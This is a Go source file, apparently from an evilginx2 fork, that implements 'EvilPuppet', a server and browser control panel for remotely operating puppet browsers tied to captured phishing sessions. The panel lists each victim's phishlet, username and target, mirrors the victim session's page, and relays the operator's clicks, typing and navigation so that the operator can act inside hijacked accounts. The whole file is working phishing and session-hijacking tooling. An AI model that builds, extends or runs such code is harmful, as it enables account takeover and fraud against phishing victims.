package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kgretzky/evilginx2/log"
)

// PuppetServer provides a web-based interface for remotely controlling puppet browser instances.
// It serves an HTML/JS UI that mirrors the puppet browser's DOM in real-time, handles WebSocket
// connections for DOM-streaming and input forwarding, and proxies resources through a cache.
type PuppetServer struct {
	pm         *PuppetManager
	port       int
	password   string
	httpServer *http.Server
}

var wsUpgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 262144,
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func NewPuppetServer(pm *PuppetManager, port int, password string) *PuppetServer {
	ps := &PuppetServer{
		pm:       pm,
		port:     port,
		password: password,
	}
	return ps
}

func (ps *PuppetServer) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/puppet/ws/", ps.handleWebSocket)
	mux.HandleFunc("/puppet/res/", ps.handleResource)
	mux.HandleFunc("/puppet/", ps.handleHTTP)

	ps.httpServer = &http.Server{
		Addr:    fmt.Sprintf(":%d", ps.port),
		Handler: mux,
	}

	go func() {
		log.Info("puppet server listening on port %d", ps.port)
		if err := ps.httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("puppet server error: %v", err)
		}
	}()
	return nil
}

func (ps *PuppetServer) Stop() {
	if ps.httpServer != nil {
		ps.httpServer.Close()
	}
}

func (ps *PuppetServer) authenticate(r *http.Request) bool {
	if ps.password == "" {
		return true
	}
	if r.URL.Query().Get("key") == ps.password {
		return true
	}
	if r.Header.Get("X-Puppet-Key") == ps.password {
		return true
	}
	return false
}

func (ps *PuppetServer) handleHTTP(w http.ResponseWriter, r *http.Request) {
	if !ps.authenticate(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	pathPart := strings.TrimPrefix(r.URL.Path, "/puppet/")
	pathPart = strings.TrimSuffix(pathPart, "/")

	if pathPart == "" {
		ps.serveListPage(w, r)
		return
	}

	puppetId, err := strconv.Atoi(pathPart)
	if err != nil {
		http.Error(w, "Invalid puppet ID", http.StatusBadRequest)
		return
	}

	_, ok := ps.pm.GetPuppet(puppetId)
	if !ok {
		http.Error(w, "Puppet not found", http.StatusNotFound)
		return
	}

	ps.serveControlPage(w, r, puppetId)
}

// handleResource serves cached resources through the proxy.
// URL format: /puppet/res/{puppetId}/?url={encoded_original_url}
func (ps *PuppetServer) handleResource(w http.ResponseWriter, r *http.Request) {
	pathPart := strings.TrimPrefix(r.URL.Path, "/puppet/res/")
	pathPart = strings.TrimSuffix(pathPart, "/")

	puppetId, err := strconv.Atoi(pathPart)
	if err != nil {
		http.Error(w, "Invalid puppet ID", http.StatusBadRequest)
		return
	}

	resourceURL := r.URL.Query().Get("url")
	if resourceURL == "" {
		http.Error(w, "Missing url parameter", http.StatusBadRequest)
		return
	}

	// URL-decode the resource URL
	resourceURL, err = url.QueryUnescape(resourceURL)
	if err != nil {
		http.Error(w, "Invalid url parameter", http.StatusBadRequest)
		return
	}

	rc, rcErr := ps.pm.GetResourceCache(puppetId)
	if rcErr != nil {
		http.Error(w, "Puppet not found", http.StatusNotFound)
		return
	}

	res, fetchErr := rc.FetchAndCache(resourceURL)
	if fetchErr != nil {
		http.Error(w, "Resource not available", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", res.MimeType)
	w.Header().Set("Cache-Control", "public, max-age=3600")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Write(res.Data)
}

func (ps *PuppetServer) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	if !ps.authenticate(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	pathPart := strings.TrimPrefix(r.URL.Path, "/puppet/ws/")
	pathPart = strings.TrimSuffix(pathPart, "/")

	puppetId, err := strconv.Atoi(pathPart)
	if err != nil {
		http.Error(w, "Invalid puppet ID", http.StatusBadRequest)
		return
	}

	puppet, ok := ps.pm.GetPuppet(puppetId)
	if !ok {
		http.Error(w, "Puppet not found", http.StatusNotFound)
		return
	}

	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error("puppet ws: upgrade error: %v", err)
		return
	}
	defer conn.Close()

	log.Info("puppet [%d]: web control client connected from %s", puppetId, r.RemoteAddr)

	// Send initial status
	statusMsg := map[string]interface{}{
		"type":      "status",
		"status":    puppet.Status.String(),
		"sessionId": puppet.SessionId,
		"phishlet":  puppet.Phishlet,
		"username":  puppet.Username,
		"viewportW": puppet.viewportW,
		"viewportH": puppet.viewportH,
	}
	statusJSON, _ := json.Marshal(statusMsg)
	conn.WriteMessage(websocket.TextMessage, statusJSON)

	// Send the last full DOM state immediately so the client renders the current page
	lastUpdate := ps.pm.GetLastUpdate(puppetId)
	if lastUpdate != nil {
		updateJSON, _ := json.Marshal(lastUpdate)
		conn.WriteMessage(websocket.TextMessage, updateJSON)
	}

	// Get channels for live streaming
	contentCh, err := ps.pm.GetContentChan(puppetId)
	if err != nil {
		log.Error("puppet ws: %v", err)
		return
	}
	inputCh, err := ps.pm.GetInputChan(puppetId)
	if err != nil {
		log.Error("puppet ws: %v", err)
		return
	}

	stopCh := make(chan struct{})

	writeMsg := func(update *DOMUpdate) bool {
		updateJSON, _ := json.Marshal(update)
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		return conn.WriteMessage(websocket.TextMessage, updateJSON) == nil
	}

	// DOM + input streaming goroutine — reads from both channels
	go func() {
		for {
			select {
			case <-stopCh:
				return
			case update, ok := <-contentCh:
				if !ok {
					return
				}
				if !writeMsg(update) {
					return
				}
			case update, ok := <-inputCh:
				if !ok {
					return
				}
				if !writeMsg(update) {
					return
				}
			}
		}
	}()

	// Set read deadline — refreshed on every message
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))

	// Read input events from the client
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		var pi PuppetInput
		if err := json.Unmarshal(message, &pi); err != nil {
			continue
		}

		if pi.Type == "ping" {
			continue
		}

		if err := ps.pm.HandleInput(puppetId, pi); err != nil {
			errMsg := map[string]string{"type": "error", "message": err.Error()}
			errJSON, _ := json.Marshal(errMsg)
			conn.WriteMessage(websocket.TextMessage, errJSON)
		}
	}

	close(stopCh)
	log.Info("puppet [%d]: web control client disconnected", puppetId)
}

func (ps *PuppetServer) serveListPage(w http.ResponseWriter, r *http.Request) {
	key := r.URL.Query().Get("key")
	puppets := ps.pm.ListPuppets()

	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	html := `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>EvilPuppet - Active Sessions</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #0d1117; color: #c9d1d9; font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif; padding: 40px; }
h1 { color: #58a6ff; margin-bottom: 8px; font-size: 28px; }
.subtitle { color: #8b949e; margin-bottom: 32px; font-size: 14px; }
.puppet-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 16px; }
.puppet-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; transition: border-color 0.2s; }
.puppet-card:hover { border-color: #58a6ff; }
.puppet-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
.puppet-id { font-size: 18px; font-weight: 600; color: #f0f6fc; }
.status { padding: 2px 10px; border-radius: 12px; font-size: 12px; font-weight: 500; }
.status-running { background: #0d419d33; color: #58a6ff; border: 1px solid #1f6feb; }
.status-starting { background: #4d2d0033; color: #d29922; border: 1px solid #9e6a03; }
.status-stopped { background: #49060633; color: #f85149; border: 1px solid #da3633; }
.status-error { background: #49060633; color: #f85149; border: 1px solid #da3633; }
.puppet-details { font-size: 13px; color: #8b949e; line-height: 1.8; }
.puppet-details strong { color: #c9d1d9; }
.btn-control { display: inline-block; margin-top: 12px; padding: 6px 16px; background: #238636; color: #fff; border: 1px solid #2ea043; border-radius: 6px; text-decoration: none; font-size: 13px; font-weight: 500; }
.btn-control:hover { background: #2ea043; }
.no-puppets { text-align: center; padding: 60px 20px; color: #8b949e; }
.no-puppets p { font-size: 16px; margin-bottom: 8px; }
.no-puppets code { background: #161b22; padding: 4px 8px; border-radius: 4px; color: #58a6ff; font-size: 14px; }
</style>
</head>
<body>
<h1>EvilPuppet</h1>
<p class="subtitle">Remote Browser Control - Active Puppet Sessions</p>`

	if len(puppets) == 0 {
		html += `<div class="no-puppets"><p>No active puppets</p><p>Launch one with <code>puppet launch &lt;session_id&gt; &lt;target_url&gt;</code></p></div>`
	} else {
		html += `<div class="puppet-grid">`
		for _, p := range puppets {
			statusClass := "status-" + p.Status.String()
			html += fmt.Sprintf(`<div class="puppet-card">
<div class="puppet-header"><span class="puppet-id">Puppet #%d</span><span class="status %s">%s</span></div>
<div class="puppet-details">
<strong>Session:</strong> #%d<br>
<strong>Phishlet:</strong> %s<br>
<strong>Username:</strong> %s<br>
<strong>Target:</strong> %s<br>
<strong>Started:</strong> %s
</div>
<a class="btn-control" href="/puppet/%d?key=%s">Open Control Panel</a>
</div>`, p.Id, statusClass, p.Status.String(), p.SessionId, p.Phishlet, p.Username, p.TargetURL, p.CreateTime.Format("2006-01-02 15:04:05"), p.Id, key)
		}
		html += `</div>`
	}

	html += `</body></html>`

	fmt.Fprint(w, html)
}

func (ps *PuppetServer) serveControlPage(w http.ResponseWriter, r *http.Request, puppetId int) {
	key := r.URL.Query().Get("key")
	puppet, ok := ps.pm.GetPuppet(puppetId)
	if !ok {
		http.Error(w, "Puppet not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, puppetControlHTML, puppetId, puppet.SessionId, puppet.Username, puppet.Phishlet, puppetId, key)
}

// puppetControlHTML is the DOM-streaming remote control interface.
// It renders the target page as real HTML in an iframe, captures user interactions,
// and forwards them to the puppet browser via WebSocket — mirroring EvilPuppetJS's approach.
// Format args: puppetId, sessionId, username, phishlet, puppetId (ws), key
var puppetControlHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>EvilPuppet #%d - Remote Control</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html, body { height: 100%%; overflow: hidden; }
body {
    background: #0d1117;
    color: #c9d1d9;
    font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
    display: flex;
    flex-direction: column;
    height: 100vh;
}
.toolbar {
    display: flex;
    align-items: center;
    padding: 6px 10px;
    background: #161b22;
    border-bottom: 1px solid #30363d;
    gap: 6px;
    flex-shrink: 0;
    z-index: 10;
}
.toolbar button {
    background: #21262d;
    border: 1px solid #30363d;
    color: #c9d1d9;
    padding: 5px 10px;
    border-radius: 6px;
    cursor: pointer;
    font-size: 15px;
    line-height: 1;
    transition: background 0.15s;
}
.toolbar button:hover { background: #30363d; }
.toolbar button:active { background: #484f58; }
.url-bar {
    flex: 1;
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 6px;
    color: #c9d1d9;
    padding: 5px 12px;
    font-size: 13px;
    font-family: 'SF Mono', 'Fira Code', monospace;
    outline: none;
    transition: border-color 0.15s;
}
.url-bar:focus { border-color: #58a6ff; }
.puppet-info {
    font-size: 11px;
    color: #8b949e;
    white-space: nowrap;
    padding: 0 8px;
}
.puppet-info .label { color: #58a6ff; font-weight: 600; }
#viewport-wrapper {
    flex: 1;
    overflow: hidden;
    position: relative;
    background: #1a1a2e;
}
#viewport {
    position: absolute;
    width: 1920px;
    height: 1080px;
    border: none;
    transform-origin: top left;
    background: #fff;
}
.statusbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 3px 10px;
    background: #161b22;
    border-top: 1px solid #30363d;
    font-size: 11px;
    color: #484f58;
    flex-shrink: 0;
}
.status-dot {
    display: inline-block;
    width: 8px;
    height: 8px;
    border-radius: 50%%;
    margin-right: 6px;
    vertical-align: middle;
}
.status-dot.connected { background: #3fb950; box-shadow: 0 0 4px #3fb95088; }
.status-dot.disconnected { background: #f85149; box-shadow: 0 0 4px #f8514988; }
.status-dot.connecting { background: #d29922; box-shadow: 0 0 4px #d2992288; animation: pulse 1.5s infinite; }
@keyframes pulse { 0%%,100%% { opacity: 1; } 50%% { opacity: 0.4; } }
.loading-overlay {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    background: #0d1117ee;
    z-index: 100;
    transition: opacity 0.3s;
}
.loading-overlay.hidden { opacity: 0; pointer-events: none; }
.loading-spinner {
    width: 40px; height: 40px;
    border: 3px solid #30363d;
    border-top-color: #58a6ff;
    border-radius: 50%%;
    animation: spin 0.8s linear infinite;
    margin-bottom: 16px;
}
@keyframes spin { to { transform: rotate(360deg); } }
.loading-text { color: #8b949e; font-size: 14px; }
</style>
</head>
<body>
<div class="toolbar">
    <button id="btn-back" title="Back">&#9664;</button>
    <button id="btn-forward" title="Forward">&#9654;</button>
    <button id="btn-refresh" title="Refresh">&#8635;</button>
    <input type="text" class="url-bar" id="url-bar" placeholder="Enter URL and press Enter..." spellcheck="false" autocomplete="off">
    <div class="puppet-info">
        <span class="label">Session</span> #%d
        &middot; <span class="label">User</span> %s
        &middot; <span class="label">Phishlet</span> %s
    </div>
</div>

<div id="viewport-wrapper">
    <iframe id="viewport"></iframe>
</div>

<div class="loading-overlay" id="loading">
    <div class="loading-spinner"></div>
    <div class="loading-text">Connecting to puppet browser...</div>
</div>

<div class="statusbar">
    <span id="status"><span class="status-dot connecting"></span>Connecting...</span>
    <span id="updates">-- updates</span>
</div>

<script>
(function() {
    var PUPPET_ID = %d;
    var WS_KEY = '%s';

    var urlBar = document.getElementById('url-bar');
    var statusEl = document.getElementById('status');
    var updatesEl = document.getElementById('updates');
    var loadingEl = document.getElementById('loading');
    var viewport = document.getElementById('viewport');
    var viewportWrapper = document.getElementById('viewport-wrapper');

    var PUPPET_W = 1920, PUPPET_H = 1080;
    var ws = null;
    var updateCount = 0;
    var reconnectDelay = 1000;
    var initialized = false;
    var iframeDoc = null;

    // Scale the 1920x1080 iframe to fit available space
    function updateScale() {
        var availW = viewportWrapper.clientWidth;
        var availH = viewportWrapper.clientHeight;
        if (availW <= 0 || availH <= 0) return;
        var scale = Math.min(availW / PUPPET_W, availH / PUPPET_H);
        viewport.style.transform = 'scale(' + scale + ')';
        var scaledW = PUPPET_W * scale;
        var scaledH = PUPPET_H * scale;
        var offsetX = Math.max(0, (availW - scaledW) / 2);
        var offsetY = Math.max(0, (availH - scaledH) / 2);
        viewport.style.left = offsetX + 'px';
        viewport.style.top = offsetY + 'px';
    }
    window.addEventListener('resize', updateScale);
    setTimeout(updateScale, 0);

    // Initialize the iframe document
    viewport.srcdoc = '<html><head></head><body></body></html>';
    viewport.onload = function() {
        iframeDoc = viewport.contentDocument || viewport.contentWindow.document;
        setupIframeEvents();
        updateScale();
    };

    // ---- CSS Path computation (matches EvilPuppetJS) ----
    function getCssPath(el) {
        if (!(el instanceof Element)) return '';
        var path = [];
        while (el.nodeType === Node.ELEMENT_NODE) {
            var selector = el.nodeName.toLowerCase();
            if (el.id) {
                selector += '#' + el.id;
                path.unshift(selector);
                break;
            } else {
                var sib = el, nth = 1;
                while (sib = sib.previousElementSibling) {
                    if (sib.nodeName.toLowerCase() == selector) nth++;
                }
                if (nth != 1) selector += ':nth-of-type(' + nth + ')';
            }
            path.unshift(selector);
            el = el.parentNode;
        }
        return path.join(' > ');
    }

    // ---- DOM morphing (updates real DOM to match new HTML without full replacement) ----
    function morphAttributes(from, to) {
        for (var i = from.attributes.length - 1; i >= 0; i--) {
            var attr = from.attributes[i];
            if (!to.hasAttribute(attr.name)) {
                from.removeAttribute(attr.name);
            }
        }
        for (var i = 0; i < to.attributes.length; i++) {
            var attr = to.attributes[i];
            if (from.getAttribute(attr.name) !== attr.value) {
                from.setAttribute(attr.name, attr.value);
            }
        }
    }

    function morphChildren(fromNode, toNode) {
        var fromChildren = Array.from(fromNode.childNodes);
        var toChildren = Array.from(toNode.childNodes);
        var maxLen = Math.max(fromChildren.length, toChildren.length);

        for (var i = 0; i < maxLen; i++) {
            var f = i < fromChildren.length ? fromChildren[i] : null;
            var t = i < toChildren.length ? toChildren[i] : null;

            if (!t) {
                fromNode.removeChild(f);
                continue;
            }
            if (!f) {
                fromNode.appendChild(fromNode.ownerDocument.importNode(t, true));
                continue;
            }
            if (f.nodeType !== t.nodeType || f.nodeName !== t.nodeName) {
                fromNode.replaceChild(fromNode.ownerDocument.importNode(t, true), f);
                continue;
            }
            if (f.nodeType === 3) {
                if (f.textContent !== t.textContent) {
                    f.textContent = t.textContent;
                }
                continue;
            }
            if (f.nodeType === 1) {
                morphAttributes(f, t);
                // For focused inputs, sync the .value property from the server
                // but skip recursive child morphing to avoid cursor disruption
                if (iframeDoc && f === iframeDoc.activeElement) {
                    var tag = f.tagName;
                    if (tag === 'INPUT' || tag === 'TEXTAREA') {
                        var serverVal = t.getAttribute('value') || '';
                        if (f.value !== serverVal) {
                            f.value = serverVal;
                            try { f.selectionStart = f.selectionEnd = f.value.length; } catch(ce) {}
                        }
                        continue;
                    }
                    if (tag === 'SELECT') continue;
                }
                morphChildren(f, t);
            }
        }
    }

    // ---- Apply DOM updates from server ----
    function applyDOMUpdate(update) {
        if (!iframeDoc) return;

        if (update.head) {
            var doc = new DOMParser().parseFromString('<html>' + update.head + '<body></body></html>', 'text/html');
            if (!initialized) {
                iframeDoc.head.innerHTML = '';
                Array.from(doc.head.childNodes).forEach(function(node) {
                    iframeDoc.head.appendChild(iframeDoc.importNode(node, true));
                });
            } else {
                morphChildren(iframeDoc.head, doc.head);
            }
        }

        if (update.body) {
            var doc = new DOMParser().parseFromString('<html><head></head>' + update.body + '</html>', 'text/html');
            if (!initialized) {
                iframeDoc.body.innerHTML = '';
                Array.from(doc.body.childNodes).forEach(function(node) {
                    iframeDoc.body.appendChild(iframeDoc.importNode(node, true));
                });
                // Copy body attributes
                for (var i = 0; i < doc.body.attributes.length; i++) {
                    var attr = doc.body.attributes[i];
                    iframeDoc.body.setAttribute(attr.name, attr.value);
                }
            } else {
                morphAttributes(iframeDoc.body, doc.body);
                morphChildren(iframeDoc.body, doc.body);
            }
        }

        if (update.head || update.body) {
            initialized = true;
        }

        if (update.url && document.activeElement !== urlBar) {
            urlBar.value = update.url;
        }
    }

    function applyInputChange(update) {
        if (!iframeDoc) return;
        try {
            var el = iframeDoc.querySelector(update.cssPath);
            if (!el) return;
            // Always apply server-side value — keydown is preventDefault'd locally
            // so this is the only way typed characters appear in the iframe
            el.value = update.value;
            if (update.selectionStart !== undefined) {
                try {
                    el.selectionStart = update.selectionStart;
                    el.selectionEnd = update.selectionEnd;
                } catch(se) {} // some input types (date, etc.) don't support selection
            }
        } catch(e) {}
    }

    // ---- Event handlers on the iframe ----
    // Click, keyboard, paste, selection, and form events are captured inside the iframe.
    // Clicks send both a CSS selector (primary, for element-accurate clicking in the puppet)
    // and x/y coordinates (fallback). This matches EvilPuppetJS's approach.
    function setupIframeEvents() {
        if (!iframeDoc) return;

        // Prevent default on mousedown to stop text selection interfering,
        // but allow it for inputs so they receive focus naturally.
        iframeDoc.addEventListener('mousedown', function(e) {
            var tag = e.target.tagName;
            if (tag !== 'INPUT' && tag !== 'TEXTAREA' && tag !== 'SELECT') {
                e.preventDefault();
            }
        });

        // Click handler: send CSS path (primary) + coordinates (fallback) to the server.
        // e.clientX/Y inside the iframe are already in the 1920x1080 viewport space
        // because CSS transform on the iframe element doesn't affect internal coordinates.
        iframeDoc.addEventListener('click', function(e) {
            e.preventDefault();
            var cssPath = getCssPath(e.target);
            sendInput({
                type: 'click',
                cssPath: cssPath,
                x: Math.round(e.clientX),
                y: Math.round(e.clientY)
            });
            // Explicitly manage focus so keyboard events reach the iframe.
            // CSS transform on the iframe can prevent automatic focus transfer.
            // Order matters: focus the window first, then the element.
            try {
                viewport.contentWindow.focus();
                var tag = e.target.tagName;
                if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') {
                    e.target.focus();
                    if (tag !== 'SELECT') {
                        try { e.target.selectionStart = e.target.selectionEnd = e.target.value.length; } catch(se) {}
                    }
                }
            } catch(fe) {}
        });

        // Keyboard handler — captures keys when focus is inside the iframe.
        // Uses _lastKeySentAt to prevent double-sends if the parent handler also fires.
        iframeDoc.addEventListener('keydown', function(e) {
            if ((e.ctrlKey || e.metaKey) && e.key === 'v') return;
            if (e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
            e.preventDefault();
            if (Date.now() - _lastKeySentAt < 50) return;
            _lastKeySentAt = Date.now();
            sendInput(buildKeyMsg(e));
        });

        // Paste handler
        iframeDoc.addEventListener('paste', function(e) {
            var text = (e.clipboardData || window.clipboardData).getData('text');
            if (text) {
                sendInput({type: 'type', text: text});
            }
            e.preventDefault();
        });

        // Selection change handler (for cursor positioning in inputs)
        iframeDoc.addEventListener('selectionchange', function() {
            var el = iframeDoc.activeElement;
            if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) {
                var cssPath = getCssPath(el);
                if (cssPath) {
                    sendInput({
                        type: 'selectionchange',
                        cssPath: cssPath,
                        selectionStart: el.selectionStart || 0,
                        selectionEnd: el.selectionEnd || 0
                    });
                }
            }
        });

        // Prevent form submissions and context menu in iframe
        iframeDoc.addEventListener('submit', function(e) { e.preventDefault(); });
        iframeDoc.addEventListener('contextmenu', function(e) { e.preventDefault(); });
    }

    // ---- WebSocket connection ----
    function connect() {
        var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
        var wsUrl = proto + '//' + location.host + '/puppet/ws/' + PUPPET_ID + '?key=' + WS_KEY;

        ws = new WebSocket(wsUrl);

        ws.onopen = function() {
            setStatus('connected', 'Connected');
            reconnectDelay = 1000;
            if (window._pingInterval) clearInterval(window._pingInterval);
            window._pingInterval = setInterval(function() {
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({type: 'ping'}));
                }
            }, 15000);
        };

        ws.onclose = function() {
            setStatus('disconnected', 'Disconnected - reconnecting...');
            if (window._pingInterval) clearInterval(window._pingInterval);
            setTimeout(connect, reconnectDelay);
            reconnectDelay = Math.min(reconnectDelay * 1.5, 10000);
        };

        ws.onerror = function() {
            setStatus('disconnected', 'Connection error');
            if (window._pingInterval) clearInterval(window._pingInterval);
        };

        ws.onmessage = function(event) {
            try {
                var msg = JSON.parse(event.data);

                if (msg.type === 'domupdate') {
                    if (!initialized) {
                        loadingEl.classList.add('hidden');
                    }
                    applyDOMUpdate(msg);
                    updateCount++;
                    updatesEl.textContent = updateCount + ' updates';
                } else if (msg.type === 'inputchange') {
                    applyInputChange(msg);
                } else if (msg.type === 'url') {
                    if (document.activeElement !== urlBar) {
                        urlBar.value = msg.url;
                    }
                } else if (msg.type === 'status') {
                    // Initial status message
                } else if (msg.type === 'error') {
                    console.error('Puppet error:', msg.message);
                }
            } catch(e) {
                console.error('Failed to parse message:', e);
            }
        };
    }

    function setStatus(state, text) {
        statusEl.innerHTML = '<span class="status-dot ' + state + '"></span>' + text;
    }

    function sendInput(msg) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(msg));
        }
    }

    // ---- Keyboard/paste on main document (fallback when focus is not inside the iframe) ----
    // When focus is inside the iframe, keyboard events fire on iframeDoc (not here).
    // When focus is on the iframe element itself (not inside it) or on the parent body,
    // keyboard events fire on the parent document and this handler catches them.
    var _lastKeySentAt = 0;
    function buildKeyMsg(e) {
        var keyName = e.key;
        if (e.ctrlKey && e.key === 'Backspace') keyName = 'CtrlBackspace';
        else if (e.ctrlKey && e.key === 'z') keyName = 'CtrlZ';
        else if (e.ctrlKey && e.key === 'y') keyName = 'CtrlY';
        var msg = {type: 'keypress', key: keyName, code: e.code};
        if (e.key.length > 1) {
            var mod = 0;
            if (e.altKey) mod |= 1;
            if (e.ctrlKey) mod |= 2;
            if (e.metaKey) mod |= 4;
            if (e.shiftKey) mod |= 8;
            if (mod) msg.modifiers = mod;
        }
        return msg;
    }
    function handleKeyDown(e) {
        if (document.activeElement === urlBar) return;
        if ((e.ctrlKey || e.metaKey) && e.key === 'v') return;
        if (e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
        e.preventDefault();
        _lastKeySentAt = Date.now();
        sendInput(buildKeyMsg(e));
    }
    document.addEventListener('keydown', handleKeyDown);
    document.addEventListener('paste', function(e) {
        if (document.activeElement === urlBar) return;
        var text = (e.clipboardData || window.clipboardData).getData('text');
        if (text) sendInput({type: 'type', text: text});
        e.preventDefault();
    });

    // ---- Toolbar buttons ----
    document.getElementById('btn-back').addEventListener('click', function() {
        sendInput({type: 'back'});
    });
    document.getElementById('btn-forward').addEventListener('click', function() {
        sendInput({type: 'forward'});
    });
    document.getElementById('btn-refresh').addEventListener('click', function() {
        sendInput({type: 'refresh'});
    });

    urlBar.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            sendInput({type: 'navigate', url: urlBar.value});
            urlBar.blur();
        }
    });

    // Start connection
    connect();
})();
</script>
</body>
</html>`
